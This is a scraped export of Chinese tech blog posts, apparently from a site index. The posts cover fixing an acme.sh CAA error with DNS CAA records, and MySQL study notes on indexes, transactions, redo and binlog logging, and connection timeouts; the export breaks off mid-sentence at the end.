签发证书时发现报错缺少 CAA 123456789[2019年 03月 22日 星期五 11:09:28 CST] Sign failed, finalize code is not 200.[2019年 03月 22日 星期五 11:09:28 CST] &#123; &quot;type&quot;: &quot;urn:ietf:params:acme:error:caa&quot;, &quot;detail&quot;: &quot;Error finalizing order :: Rechecking CAA: While processing CAA for awen.me: DNS problem: SERVFAIL looking up CAA for awen.me, While processing CAA for *.awen.me: DNS problem: SERVFAIL looking up CAA for awen.me&quot;, &quot;status&quot;: 403&#125;[2019年 03月 22日 星期五 11:09:28 CST] Please add &#39;--debug&#39; or &#39;--log&#39; to check more details.[2019年 03月 22日 星期五 11:09:28 CST] See: https:&#x2F;&#x2F;github.com&#x2F;Neilpang&#x2F;acme.sh&#x2F;wiki&#x2F;How-to-debug-acme.sh 什么是 CAACAA（Certification Authority Authorization，证书颁发机构授权）是一项防止HTTPS证书错误颁发的安全措施，遵从IETF RFC6844。从2017年9月8日起，要求CA（Certification Authority，证书颁发）机构执行CAA强制性检查。 它被定义在 RFC6844，其目的是用来指定域名允许哪个证书颁发机构（CA）为其颁发证书。防止钓鱼攻击者使用该域名申请 SSL 证书。 它们还提供了一种方法来指示通知规则，以防有人从未经授权的 CA 颁发证书。在没有 CAA 记录的情况下，所有 CA 均可为该域名颁发证书。当然如果存在 CAA 记录，CA 必须遵守规则，只能是在记录列表中的 CA 才被允许。 CAA记录可以为整个域或特定主机名设置策略。CAA 记录也被子域继承，因此 CAA 记录集 example.com 也将适用于任何子域，例如 subdomain.example.com（除非被覆盖）。CAA 记录可以控制发行单域名证书，通配符证书或同时。 CAA标准CAA标准是指域名所有者在其域名DNS记录的CAA字段中，授权指定的CA机构为其域名颁发证书。 全球约有上百个CA机构有权发放HTTPS证书，证明您网站的身份。CAA标准可以使网站将指定CA机构列入白名单，仅授权指定CA机构为网站的域名颁发证书，防止HTTPS证书错误颁发。设置CAA记录是提高网站安全性的方法之一。 CA机构在为域名签发证书时执行CAA强制性检查： 如果检查域名的DNS记录，发现未设置CAA字段，则为该域名颁发证书。 这种情况下，任何CA机构均可为该域名签发证书，存在HTTPS证书错误颁发的风险。 如果检查域名的DNS记录，在CAA字段发现获得授权，则为该域名颁发证书。 如果检查域名的DNS记录，在CAA字段发现未获得授权，则拒绝为该域名颁发证书，防止未授权HTTPS证书错误颁发。 CAA记录CAA记录由一个[flag]标志字节和一个被称为属性的[tag]-[value]标（标签-值）对组成，可以将多个CAA字段添加到域名的DNS记录中。 目的 样例 描述 设置单域名CAA记录 domain.com. CAA 0 issue “ca.example.com” 该字段表示只有ca.example.com可以为域名domain.com颁发证书，未经授权的第三方CA机构申请域名domain.com的HTTP证书将被拒绝。 domain.com. CAA 0 issue “;” 该字段表示拒绝任何CA机构为域名domain.com颁发证书。 设置发送警报通知 domain.com. CAA 0 iodef “mailto:admin@domain.com“ 该字段用于当第三方尝试为一个未获得授权的域名申请证书时，通知CA机构向网站所有者发送警报邮件。 domain.com. CAA 0 iodef “http:// domain.com/log/“domain.com. CAA 0 iodef “https:// domain.com/log/“ 该字段用于记录尝试在其他CA申请HTTPS证书的行为。 设置颁发通配符域名证书 domain.com. CAA 0 issuewild “ca.example.com” 该字段用于将通配符证书的颁发权限指定CA机构ca.example.com。 综合配置样例 domain.com. CAA 0 issue “ca.abc.com”domain.com. CAA 0 issuewild “ca.def.com”domain.com. CAA 0 iodef “mailto:admin@domain.com“ 该字段表示域名domain.com：授权CA机构ca.abc.com颁发不限类型的证书。授权CA机构ca.def.com颁发通配符证书。禁止其他CA机构颁发证书。当有违反设置规则的情况发生，CA机构发送通知邮件到admin@domain.com。 验证CAA解析记录是否生效？CAA解析记录可以通过dig+trace命令查看域名是否生效以及具体的解析过程。 命令格式为：dig [类型] [域名] +trace。 示例如下： dig caa www.example.com +trace CAA 记录格式CAA 记录由以下元素组成： 标签 描述 flag 0-255 之间的无符号整数 tag 用来表示关键标志，RFC 有定义 value 与 tag 关联的值 CAA 记录的规范的表示法是： 1CAA &lt;flags&gt; &lt;tag&gt; &lt;value&gt; RFC 目前定义了 3 个可用的 tag： issue：明确授权单个证书颁发机构颁发主机名的证书（任何类型）。 issuewild：明确授权单个证书颁发机构为主机名颁发通配符证书（只有通配符）。 iodef：指定认证机构可以向其报告策略违规的URL或邮箱。 实战登录https://sslmate.com/caa 输入你的域名，会自动生成CAA记录 然后在阿里云添加解析即可。 查询解析结果 123456789101112131415161718192021 dig CAA awen.me; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @114.114.114.114 CAA awen.me; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 21875;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0;; QUESTION SECTION:;awen.me. IN CAA;; ANSWER SECTION:awen.me. 600 IN CAA 0 issue &quot;digicert.com&quot;awen.me. 600 IN CAA 0 issue &quot;letsencrypt.org&quot;awen.me. 600 IN CAA 0 issue &quot;sectigo.com&quot;;; Query time: 138 msec;; SERVER: 114.114.114.114#53(114.114.114.114);; WHEN: Fri Mar 22 11:35:29 CST 2019;; MSG SIZE rcvd: 120 允许 签发通配符证书 记录值需要设置0 issuewild &quot;letsencrypt.org&quot;，如下所示： 12345678910111213141516171819; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @114.114.114.114 CAA awen.me; (1 server found);; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 48933;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;awen.me. IN CAA;; ANSWER SECTION:awen.me. 493 IN CAA 0 issuewild &quot;letsencrypt.org&quot;;; Query time: 48 msec;; SERVER: 114.114.114.114#53(114.114.114.114);; WHEN: Fri Mar 22 11:52:59 CST 2019;; MSG SIZE rcvd: 74","categories":[],"tags":[{"name":"dns","slug":"dns","permalink":"https://awen.me/tags/dns/"}]},{"title":"深入浅出Mysql 索引","slug":"深入浅出Mysql-索引","date":"2019-03-21T12:11:35.000Z","updated":"2021-02-26T06:05:29.345Z","comments":true,"path":"posts/50892.html","link":"","permalink":"https://awen.me/posts/50892.html","excerpt":"索引就是为了提高查询效率，就像书的目录一样。 索引的常见类型索引的出现是为了提高查询效率，但是实现索引的方式却有很多种，例如哈希表、有序数组和搜索树等。 哈希表 哈希表是一种以键-值(key-value) 存储数据的结构，我们只要输入待查找的值即key,就可以找到其对应的值即Value。哈希的思路很简单，把值放在数组里，用一个哈希函数把key换算成一个确定的位置，然后把value放在数组的这个位置。","text":"索引就是为了提高查询效率，就像书的目录一样。 索引的常见类型索引的出现是为了提高查询效率，但是实现索引的方式却有很多种，例如哈希表、有序数组和搜索树等。 哈希表 哈希表是一种以键-值(key-value) 存储数据的结构，我们只要输入待查找的值即key,就可以找到其对应的值即Value。哈希的思路很简单，把值放在数组里，用一个哈希函数把key换算成一个确定的位置，然后把value放在数组的这个位置。 哈希表这种结构适用于只有等值查询的场景，比如mencached 或一些NoSQL。 有序数组在等值查询和范围查询场景中的性能都非常优秀 二叉树 二叉搜索树的特点是:每个节点的左儿子小于父节点，父节点又小于右儿子。这样如果你要查ID_ card_ n2的话，按照图中的搜索顺序就是按照UserA -&gt; UserC -&gt; UserF -&gt; User2这个路径得到。这个时间复杂度是0(log(N))。 树可以有二叉，也可以有多叉。多叉树就是每个节点有多个儿子，儿子之间的大小保证从左到右递增。二叉树是搜索效率最高的，但是实际上大多数的数据库存储却并不使用二叉树。其原因是，索引不止存在内存中，还要写到磁盘上。 你可以想象一下一棵100万节点的平衡二叉树，树高20。一次查询可能需要访问20个数据块。在机械硬盘时代，从磁盘随机读一个数据块需要10 ms左右的寻址时间。也就是说，对于一个100万行的表，如果使用二叉树来存储，单独访问一个行可能需要20个10 ms的时间，这个查询可真够慢的。 为了让一个查询尽量少地读磁盘，就必须让查询过程访问尽量少的数据块。那么，我们就不应该使用二叉树，而是要使用“N叉”树。这里，“N 叉”树中的“N”取决于数据块的大小。 以InnoDB的一个整数字段索引为例，这个N差不多是1200。这棵树高是4的时候，就可以存1200的3次方个值，这已经17亿了。考虑到树根的数据块总是在内存中的，-个10亿行的表上一个整数字段的索引，查找一个值最多只需要访问3次磁盘。其实，树的第二层也有很大概率在内存中，那么访问磁盘的平均次数就更少了。 N叉树由于在读写上的性能优点，以及适配磁盘的访问模式，已经被广泛应用在数据库引擎中了。 不管是哈希还是有序数组 或是N 叉树，它们都是不断迭代不断优化的解决方案。 InnoDB 的索引模型在InnoDB中，表都是根据主键顺序以索引的形式存放的，这种存储方式的表称为索引组织表。又因为前面我们提到的，InnoDB 使用了B+树索引模型，所以数据都是存储在B+树中的。每一个索引在InnoDB里面对应一棵B+树。 索引分为主键索引和非主键索引 主键索引的叶子节点存的是整行数据。在InnoDB里，主键索引也被称为聚簇索引(clusteredindex)。 非主键索引的叶子节点内容是主键的值。在InnoDB里，非主键索引也被称为二级索引 (secondary index) 123456789101112131415161718192021222324252627282930313233mysql&gt; create table T( -&gt; id int primary key, -&gt; k int not null, -&gt; name varchar(16), -&gt; index (k))engine&#x3D;InnoDB;Query OK, 0 rows affected (0.05 sec)mysql&gt; insert into T(id,k) values(100,1);Query OK, 1 row affected (0.02 sec)mysql&gt; insert into T(id,k) values(200,2);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into T(id,k) values(300,3);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into T(id,k) values(500,5);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into T(id,k) values(600,6);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from T;+-----+---+------+| id | k | name |+-----+---+------+| 100 | 1 | NULL || 200 | 2 | NULL || 300 | 3 | NULL || 500 | 5 | NULL || 600 | 6 | NULL |+-----+---+------+5 rows in set (0.00 sec) 基于主键索引和普通索引的查询有什么区别? 如果语句是 select * from T where ID=500， 即主键查询方式，则只需要搜索ID这棵B+树; 如果语句是 select * from T where k=5，即普通索引查询方式，则需要先搜索k索引树，得到ID的值为500，再到ID索引树搜索一次。这个过程称为回表。 也就是说，基于非主键索引的查询需要多扫描一棵索引树。因此，我们在应用中应该尽量使用主键查询。 索引维护 B+ 树为了维护索引有序性，在插入新值的时候需要做必要的维护。以上面这个图为例，如果插入新的行 ID 值为 700，则只需要在 R5 的记录后面插入一个新记录。如果新插入的 ID 值为 400，就相对麻烦了，需要逻辑上挪动后面的数据，空出位置。 而更糟的情况是，如果 R5 所在的数据页已经满了，根据 B+ 树的算法，这时候需要申请一个新的数据页，然后挪动部分数据过去。这个过程称为页分裂。在这种情况下，性能自然会受影响。 除了性能外，页分裂操作还影响数据页的利用率。原本放在一个页的数据，现在分到两个页中，整体空间利用率降低大约 50%。 当然有分裂就有合并。 当相邻两个页由于删除了数据，利用率很低之后，会将数据页做合并。合并的过程，可以认为是分裂过程的逆过程。 自增主键的使用场景插入新记录的时候可以不指定ID的值，系统会获取当前ID最大值加1作为下一条记录的ID 值。 也就是说，自增主键的插入数据模式，正符合了我们前面提到的递增插入的场景。每次插入一-条新记录，都是追加操作，都不涉及到挪动其他记录，也不会触发叶子节点的分裂。 而有业务逻辑的字段做主键，则往往不容易保证有序插入，这样写数据成本相对较高。 除了考虑性能外，我们还可以从存储空间的角度来看。假设你的表中确实有一个唯一字段， 比如字符串类型的身份证号，那应该用身份证号做主键，还是用自增字段做主键呢? 由于每个非主键索引的叶子节点_上都是主键的值。如果用身份证号做主键，那么每个二级索引的叶子节点占用约20个字节，而如果用整型做主键，则只要4个字节，如果是长整型(bigint)则是8个字节。 主键长度越小，普通索引的叶子节点就越小，普通索引占用的空间也就越小。 所以，从性能和存储空间方面考量，自增主键往往是更合理的选择。 有没有什么场景适合用业务字段直接做主键的呢？还是有的。比如，有些业务的场景需求是这样的： 只有一个索引。 该索引必须是唯一索引。 重建索引下面这样重建索引会有什么影响 重建索引 k 12alter table T drop index k;alter table T add index(k); 重建主键索引 12alter table T drop primary key;alter table T add primary key(id); 答案 重建索引 k 的做法是合理的，可以达到省空间的目的。但是，重建主键的过程不合理。不论是删除主键还是创建主键，都会将整个表重建。所以连着执行这两个语句的话，第一个语句就白做了。这两个语句，你可以用这个语句代替 ： 1alter table T engine&#x3D;InnoDB 覆盖索引在下面这个表T中,如果我执行 select* from t where k between3and5,需要执行几次树的搜索操作,会扫描多少行? 12345678mysql&gt; create table T (ID int primary key,k int NOT NULL DEFAULT 0, s varchar(16) NOT NULL DEFAULT &#39;&#39;,index k(k))engine&#x3D;InnoDB;insert into T values(100,1, &#39;aa&#39;),(200,2,&#39;bb&#39;),(300,3,&#39;cc&#39;),(500,5,&#39;ee&#39;),(600,6,&#39;ff&#39;),(700,7,&#39;gg&#39;); 流程： 在k索引数上找到k=3 的几率，取得 ID = 300； 再到 ID 索引树查找 ID = 300，对应的 R3 在K索引数取下一个值 K=5，取得ID = 500； 在回到 ID 索引树查找 ID=500，对应的 R4 在 K索引树取下一个值，k=6 不满足条件，循环结束。 在整个过程中，回到主键索引树的过程称为回表 如果执行的语句是 select ID from T where k between 3and 5,这时只需要查D的值,而 ID 的值已经在k索引树上了,因此可以直接提供查询结果,不需要回表。也就是说,在这个查询里面,索引k已经“覆盖了”我们的查询需求,我们称为覆盖索引 由于覆盖索引可以減少树的搜索次数,显著提升查询性能,所以使用覆盖索引是一个常用的性能优化手段 需要注意的是,在引擎內部使用覆盖索引在索引k上其实读了三个记录,R3-R5(对应的索引k 上的记录项),但是对于 MySQL的 Server层来说,它就是找引擎拿到了两条记录,因此MYSQL认为扫描行数是2。","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"}]},{"title":"深入理解 mysql 的事务","slug":"深入理解-mysql-的事务","date":"2019-03-21T01:42:52.000Z","updated":"2021-02-26T06:05:29.346Z","comments":true,"path":"posts/26142.html","link":"","permalink":"https://awen.me/posts/26142.html","excerpt":"事务就是要保证一组数据库操作，要么全部成功，要么全部失败。 并不是所有的引擎都支持事务。比如 MySQL 原生的 MyISAM 就不支持事务，因此被InnoDB 取代。","text":"事务就是要保证一组数据库操作，要么全部成功，要么全部失败。 并不是所有的引擎都支持事务。比如 MySQL 原生的 MyISAM 就不支持事务，因此被InnoDB 取代。 隔离性和隔离级别什么是 ACID？ ACID（Atomicity、Consistency、Isolation、Durabilty，即原子性、一致性、隔离性、持久性） 隔离性当数据库有多个事务同时执行，就可能会出现 脏读、不可重复读、幻读等问题，为了解决这些问题就出现了”隔离级别” 隔离的越严，效率就会越低，因此，需要找寻平衡点 SQL 标准的事务隔离级别包括: 读未提交 read uncommitted ，一个事务还没有提交时，它做的变更可能被其他事务看到。 读提交 read committed，一个事务提交之后，它做的变更才会被其他事务看到。 可重复读 repeatable read，一个事务执行过程中看到的数据，总是跟这个事务在启动时候看到的数据是一致的，当然在可重复读隔离级别下，未提交变更对其他事务也是不可见的。 串行化 serializable，对于同一行记录，”写”会加”写锁”，”读”会加”读锁”，当读写冲突时，后访问的事务必须先等前面的事务执行完成才可以继续。 例子： 假设数据表 T 中只有一列，其中一行的值为 1 12mysql&gt; create table T(c int) engine&#x3D;InnoDB;insert into T(c) values(1); 如图所示，不同隔离级别下，事务 A 会有哪些不同的返回结果： 若隔离级别是”读未提交”，则 v1 的值是 2 这个时候事务B 虽然还没有提交，但是结果 A 已经看到了，因此 v2 和 v3 的值也是 2。 若隔离级别是”读提交”，则 v1 是 1 v2 的值 是 2 ，事务 B 的更新在提交后才能被 A 看到，所以 v3 的值也是 2。 若隔离级别是”可重复读”，则 v1 v2 是1 v3 是 2 ，之所以v2 还是1 遵循的就是 事务在执行期间看到的数据前后必须是一致的。 若隔离级别是”串行化”，则事务 B 执行”将1改成2”的时候，会被锁住，直到 A 提交后，事务 B 才可以继续执行，所以从 A 的角度看 v1 v2 的值是 1 v3 的值是 2。 在实现上，数据库里面会创建一个视图，访问的时候以视图的逻辑结果为准。在“可重复读”隔离级别下，这个视图是在事务启动时创建的，整个事务存在期间都用这个视图。在“读提交”隔离级别下，这个视图是在每个 SQL 语句开始执行的时候创建的。这里需要注意的是，“读未提交”隔离级别下直接返回记录上的最新值，没有视图概念；而“串行化”隔离级别下直接用加锁的方式来避免并行访问。 我们可以看到在不同的隔离级别下，数据库行为是有所不同的。Oracle 数据库的默认隔离级别其实就是“读提交”，因此对于一些从 Oracle 迁移到 MySQL 的应用，为保证数据库隔离级别的一致，你一定要记得将 MySQL 的隔离级别设置为“读提交”。 配置的方式是，将启动参数 transaction-isolation 的值设置成 READ-COMMITTED。你可以用 show variables 来查看当前的值。 1234567mysql&gt; show variables like &quot;transaction_isolation&quot;;+-----------------------+-----------------+| Variable_name | Value |+-----------------------+-----------------+| transaction_isolation | REPEATABLE-READ |+-----------------------+-----------------+1 row in set (0.01 sec) 事务隔离的实现在 MySQL 中，实际上每条记录在更新的时候都会同时记录一条回滚操作。记录上的最新值，通过回滚操作，都可以得到前一个状态的值。 假设一个值从 1 被按顺序改成了 2、3、4，在回滚日志里面就会有类似下面的记录。 当前值是 4, 但是在查询这条记录的时候，不同时刻启动的事务会有不同的 read. -view。如图中看到的，在视图 A、B、C 里面，这一个记录的值分别是 1、2、4,，同一条记录在系统中可以存在多个版本，就是数据库的多版本并发控制（MVCC）。对于 read-view A，要得到 1, 就必须将当前值依次执行图中所有的回滚操作得到。 同时你会发现，即使现在有另外一个事务正在将 4 改成 5, 这个事务跟 read- -view A、B、C 对应的事务是不会冲突的。 回滚日志什么时候删除 当系统里没有比这个回滚日志更早的 read-view 的时候,回滚日志会被删除。 为什么尽量不要使用长事务 长事务意味着系统里面会存在很老的事务视图。由于这些事务随时可能访问数据库里面的任何数据，所以这个事务提交之前，数据库里面它可能用到的回滚记录都必须保留，这就会导致大量占。用存储空间。， 在 MySQL 5.5 及以前的版本，回滚日志是跟数据字典一起放在 ibdata 文件里的，即使长事务最终提交，回滚段被清理，文件也不会变小。我见过数据只有 20 GB，而回滚段有 200 GB 的库。最终只好为了清理回滚段，重建整个库。 除了对回滚段影响，长事务还占用锁资源，拖垮整个库。 事务的启动方式长事务有这些潜在风险，建议尽量避免。MySQL 的事务启动方式有以下几种： 显式启动事务语句，begin 或 start transaction。配套的提交语句是 commit，回滚语句是 rollback。 Set autocommit=0，这个命令会将这个线程的自动提交关掉。意味着如果你只执行一-个 select 语句，这个事务就启动了，而且并不会自动提交。这个事务持续存在直到你主动执行 commit 或 rollback 语句，或者断开连接。 有些客户端连接框架会默认连接成功后先执行一个 set autocommit=0 的命令。这就导致接下来的查询都在事务中，如果是长连接，就导致了意外的长事务。 因此，建议你总是使用 set autocommit=1, 通过显式语句的方式来启动事务。 mysql 5.7 默认 autocommit 是 ON 也就是 1 ； 123456789101112131415161718192021222324mysql&gt; show variables like &quot;auto%&quot;;+--------------------------+-------+| Variable_name | Value |+--------------------------+-------+| auto_increment_increment | 1 || auto_increment_offset | 1 || autocommit | ON || automatic_sp_privileges | ON |+--------------------------+-------+4 rows in set (0.00 sec)mysql&gt; set autocommit&#x3D;0;Query OK, 0 rows affected (0.00 sec)mysql&gt; show variables like &quot;auto%&quot;;+--------------------------+-------+| Variable_name | Value |+--------------------------+-------+| auto_increment_increment | 1 || auto_increment_offset | 1 || autocommit | OFF || automatic_sp_privileges | ON |+--------------------------+-------+4 rows in set (0.00 sec) 解决 “多-次交互”的问题 对于一个需要频繁使用事务的业务，第二种方式每个事务在开始时都不需要主动执行一次“begin”，减少了语句的交互次数。如果你也有这个顾虑，我建议你使用 commit work and chain 语法。 如何避免长事务对业务的影响这个问题，可以从应用开发端和数据库端来看。 首先，从应用开发端来看: 1.确认是否使用了set autocommit=0。这个确认工作可以在测试环境中开展，把MySQL的general log开起来，然后随便跑一个业务逻辑，通过general log的日志来确认。- 般框架如果会设置这个值，也就会提供参数来控制行为，你的目标就是把它改成1。 2.确认是否有不必要的只读事务。有些框架会习惯不管什么语句先用begin/commit框起来。我 见过有些是业务并没有这个需要，但是也把好几个select语句放到了事务中。这种只读事务可以去掉。 3.业务连接数据库的时候，根据业务本身的预估，通过SET MAX_ EXECUTION_ TIME命令，来 控制每个语句执行的最长时间，避免单个语句意外执行太长时间。(为什么 会意外?在后续的文章中会提到这类案例) 其次，从数据库端来看: 1.监控information_ schema.Innodb_ _trx 表，设置长事务阈值，超过就报警或者kill; 2.Percona的pt- kill这个工具不错，推荐使用; 3.在业务功能测试阶段要求输出所有的general log,分析日志行为提前发现问题; 4.如果使用的是MySQL 5.6或者更新版本，把innodb_ undo_ tablespaces 设置成2 (或更大的值)。如果真的出现大事务导致回滚段过大，这样设置后清理起来更方便。 本篇是一篇学习笔记，大部分内容来源于 极客时间 《Mysql 实战 45 讲》","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"}]},{"title":"mysql 的两个重要日志模块","slug":"mysql-的两个重要日志模块","date":"2019-03-20T13:20:09.000Z","updated":"2021-02-26T06:05:29.280Z","comments":true,"path":"posts/52759.html","link":"","permalink":"https://awen.me/posts/52759.html","excerpt":"mysql 的两个重要日志模块 redo log(重做日志) 和 binlog(归档日志) redo log 用于保证 crash-safe 能力。innodb_flush_log_at_trx_commit 这个参数设置成 1 的时候，表示每次事务的 redo log 都直接持久化到磁盘。这个参数建议你设置成 1，这样可以保证 MySQL 异常重启之后数据不丢失。","text":"mysql 的两个重要日志模块 redo log(重做日志) 和 binlog(归档日志) redo log 用于保证 crash-safe 能力。innodb_flush_log_at_trx_commit 这个参数设置成 1 的时候，表示每次事务的 redo log 都直接持久化到磁盘。这个参数建议你设置成 1，这样可以保证 MySQL 异常重启之后数据不丢失。 sync_binlog 这个参数设置成 1 的时候，表示每次事务的 binlog 都持久化到磁盘。这个参数建议你设置成 1，这样可以保证 MySQL 异常重启之后 binlog 不丢失。 redo log 和binlog 的区别这两种日志有以下三点不同： redo log 是 InnoDB 引擎特有的；binlog 是 MySQL 的 Server 层实现的，所有引擎都可以使用。 redo log 是物理日志，记录的是“在某个数据页上做了什么修改”；binlog 是逻辑日志，记录的是这个语句的原始逻辑，比如“给 ID=2 这一行的 c 字段加 1 ”。 redo log 是循环写的，空间固定会用完；binlog 是可以追加写入的。“追加写”是指 binlog 文件写到一定大小后会切换到下一个，并不会覆盖以前的日志。 write pos 是当前记录的位置，一边写一边后移，写到第 3 号文件末尾后就回到 0 号文件开头。checkpoint 是当前要擦除的位置，也是往后推移并且循环的，擦除记录前要把记录更新到数据文件。 write pos 和 checkpoint 之间的是“粉板”上还空着的部分，可以用来记录新的操作。如果 write pos 追上 checkpoint，表示“粉板”满了，这时候不能再执行新的更新，得停下来先擦掉一些记录，把 checkpoint 推进一下。 有了 redo log，InnoDB 就可以保证即使数据库发生异常重启，之前提交的记录都不会丢失，这个能力称为crash-safe。 一条更新语句的流程语句 1mysql&gt; update T set c&#x3D;c+1 where ID&#x3D;2; 执行器先找引擎取 ID=2 这一行。ID 是主键，引擎直接用树搜索找到这一行。如果 ID=2 这一行所在的数据页本来就在内存中，就直接返回给执行器；否则，需要先从磁盘读入内存，然后再返回。 执行器拿到引擎给的行数据，把这个值加上 1，比如原来是 N，现在就是 N+1，得到新的一行数据，再调用引擎接口写入这行新数据。 引擎将这行新数据更新到内存中，同时将这个更新操作记录到 redo log 里面，此时 redo log 处于 prepare 状态。然后告知执行器执行完成了，随时可以提交事务。 执行器生成这个操作的 binlog，并把 binlog 写入磁盘。 执行器调用引擎的提交事务接口，引擎把刚刚写入的 redo log 改成提交（commit）状态，更新完成。 最后三步，将redo log 的写入拆分了2个步骤： prepare 和 commit 这就是”两阶段提交” 两阶段提交为什么必须有“两阶段提交”呢？这是为了让两份日志之间的逻辑一致。由于 redo log 和 binlog 是两个独立的逻辑，如果不用两阶段提交，要么就是先写完 redo log 再写 binlog，或者采用反过来的顺序。如果不使用“两阶段提交”，那么数据库的状态就有可能和用它的日志恢复出来的库的状态不一致。 假设语句 1mysql&gt; update T set c&#x3D;c+1 where ID&#x3D;2; 先写 redo log 后写 binlog。假设在 redo log 写完，binlog 还没有写完的时候，MySQL 进程异常重启。由于我们前面说过的，redo log 写完之后，系统即使崩溃，仍然能够把数据恢复回来，所以恢复后这一行 c 的值是 1。 但是由于 binlog 没写完就 crash 了，这时候 binlog 里面就没有记录这个语句。因此，之后备份日志的时候，存起来的 binlog 里面就没有这条语句。 然后你会发现，如果需要用这个 binlog 来恢复临时库的话，由于这个语句的 binlog 丢失，这个临时库就会少了这一次更新，恢复出来的这一行 c 的值就是 0，与原库的值不同。 先写 binlog 后写 redo log。如果在 binlog 写完之后 crash，由于 redo log 还没写，崩溃恢复以后这个事务无效，所以这一行 c 的值是 0。但是 binlog 里面已经记录了“把 c 从 0 改成 1”这个日志。所以，在之后用 binlog 来恢复的时候就多了一个事务出来，恢复出来的这一行 c 的值就是 1，与原库的值不同。 本篇是一篇学习笔记，大部分内容来源于 极客时间 《Mysql 实战 45 讲》","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"}]},{"title":"一条mysql 语句的背后","slug":"一条mysql-语句的背后","date":"2019-03-20T02:44:52.000Z","updated":"2021-02-26T06:05:29.295Z","comments":true,"path":"posts/22850.html","link":"","permalink":"https://awen.me/posts/22850.html","excerpt":"Mysql 的基本架构图","text":"Mysql 的基本架构图 MYSQL 的整个架构可以分为 server 层 和存储引擎层2个部分，其中 Server 层 包括： 连接器 查询缓存 分析器 优化器 执行器 server 层涵盖了 Mysql 的大多少核心服务功能以及内置函数 存储引擎层 负责数据的存储和提取其架构是插件式的，支持 InnoDB、MyISAM、Memory 等存储引擎，目前主流的是InnoDB，从 mysql 5.5.5 开始默认使用InnoDB 引擎。 连接器当我们连接数mysql时 ，通常我们会-h 指定服务器IP -u 指定用户名 -p 指定密码，mysql 默认的端口是 3306，然后输入密码 12$ mysql -h 192.168.10.1 -u root -pEnter password: 这个时候连接器就开始工作了，连接器负责跟客户端建立连接、获取权限、维持和管理连接。 在完成 TCP 握手后，连接器会认证你的身份，这个输入需要你输入用户名和密码，如果密码不对你会收到一条Access denied for user 的错误，如下所示： 1ERROR 1045 (28000): Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES) 如果认证通过，连机器或到权限表里面查出当前用户所拥有的权限，之后，这个连接里面的权限判断逻辑，都会依赖此时所读取到的权限。 一旦用户建立连接成功后，即使你用管理员账号对用户的权限做了修改，也不会影响已经连接的权限。 连接完成后，如果后续没有动作，这个连接就处于空闲状态，可以通过show processlist; 查看，其中 sleep就表示现在系统里面有一个空闲状态。 12345678mysql&gt; show processlist;+----+------+-----------+------+---------+------+----------+------------------+| Id | User | Host | db | Command | Time | State | Info |+----+------+-----------+------+---------+------+----------+------------------+| 5 | root | localhost | NULL | Query | 0 | starting | show processlist || 7 | root | localhost | NULL | Sleep | 6 | | NULL |+----+------+-----------+------+---------+------+----------+------------------+2 rows in set (0.00 sec) 客户端如果太长时间没有动静，连接器就会自动断开，这个时间是由参数 wait_timeout 控制的，默认是 8小时，如果在连接被断开之后，客户端再次发送请求，就会收到如下错误： 1ERROR 2013 (HY000): Lost connection to MySQL server during query 在5.7以前，这个超时时间的相关参数可以在 information_schema 库下的 SESSION_VARIABLES 表中查询，而5.7 以后，直接查询该表会提示 1ERROR 3167 (HY000): The &#39;INFORMATION_SCHEMA.SESSION_VARIABLES&#39; feature is disabled; see the documentation for &#39;show_compatibility_56&#39; 如果希望沿用information_schema中进行查询的习惯，5.7提供了show_compatibility_56参数，设置为ON可以兼容5.7之前的用法。 5.7 以后System and status 变量需要从performance_schema中进行获取，要获取系统超时时间，我们可以执行如下语句查看系统超时时间的相关设置： 12345678mysql&gt; select variable_name,variable_value from performance_schema.session_variables where variable_name in (&#39;interactive_timeout&#39;,&#39;wait_timeout&#39;);+---------------------+----------------+| variable_name | variable_value |+---------------------+----------------+| interactive_timeout | 28800 || wait_timeout | 28800 |+---------------------+----------------+2 rows in set (0.00 sec) interactive_timeout 参数是针对交互式连接，例如通过mysql客户端连接数据库是交互式连接， wait_timeout针对非交互式连接，例如通过jdbc连接数据库是非交互式连接。 如果需要修改 WAIT_TIMEOUT ，可以执行语句： 12mysql&gt; set session WAIT_TIMEOUT&#x3D;10;Query OK, 0 rows affected (0.00 sec) 如果要修改INTERACTIVE_TIMEOUT 则执行语句: 12mysql&gt; set session INTERACTIVE_TIMEOUT&#x3D;10;Query OK, 0 rows affected (0.00 sec) 在连接启动的时候，根据连接的类型，来确认会话变量wait_timeout的值是继承于全局变量wait_timeout，还是interactive_timeout。 123456789mysql&gt; select variable_name,variable_value from global_variables where variable_name in(&#39;interactive_timeout&#39;,&#39;wait_timeout&#39;) -&gt; ;+---------------------+----------------+| variable_name | variable_value |+---------------------+----------------+| interactive_timeout | 28800 || wait_timeout | 28800 |+---------------------+----------------+2 rows in set (0.00 sec) 设置全局 wait_timeout 123456789101112mysql&gt; set global wait_timeout&#x3D;20;Query OK, 0 rows affected (0.00 sec)mysql&gt; select variable_name,variable_value from global_variables where variable_name in(&#39;interactive_timeout&#39;,&#39;wait_timeout&#39;) -&gt; ;+---------------------+----------------+| variable_name | variable_value |+---------------------+----------------+| interactive_timeout | 28800 || wait_timeout | 20 |+---------------------+----------------+2 rows in set (0.01 sec) 控制连接最大空闲时长的wait_timeout参数。 对于非交互式连接，类似于jdbc连接，wait_timeout的值继承自服务器端全局变量wait_timeout。 对于交互式连接，类似于mysql客户单连接，wait_timeout的值继承自服务器端全局变量interactive_timeout。 判断一个连接的空闲时间，可通过show 